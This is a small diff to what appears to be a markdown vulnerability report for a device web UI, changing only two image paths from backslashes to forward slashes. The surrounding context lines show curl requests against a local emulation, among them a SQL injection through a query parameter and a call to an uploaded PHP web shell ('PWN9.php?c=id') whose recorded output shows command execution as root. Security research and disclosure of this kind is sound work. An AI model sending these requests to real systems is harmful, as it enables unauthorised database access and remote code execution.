@@ -60,7 +60,7 @@ curl -s 'http://127.0.0.1:8099/webui/?g=nobusiness_setting_appid_export&org=zz%2
 # Observed: the response contains the selected columns of bussiness_org (empty in a fresh emulation)
 ```
 
-![image-20261017141732913](.\image-20261017141732913.png)
+![image-20261017141732913](./image-20261017141732913.png)
 
 ### Write / arbitrary SQL (`nobusiness_unitinfo_submit`)
 
@@ -86,7 +86,7 @@ curl -s 'http://127.0.0.1:8099/webui/attachements/PWN9.php?c=id'
 # Observed: SQLite format 3 … + RCE_OK_uid=0(root) gid=0(root) groups=0(root)
 ```
 
-![image-20261017145722034](.\image-20261017145722034.png)
+![image-20261017145722034](./image-20261017145722034.png)
 
 ## 4. Root Cause Summary
 
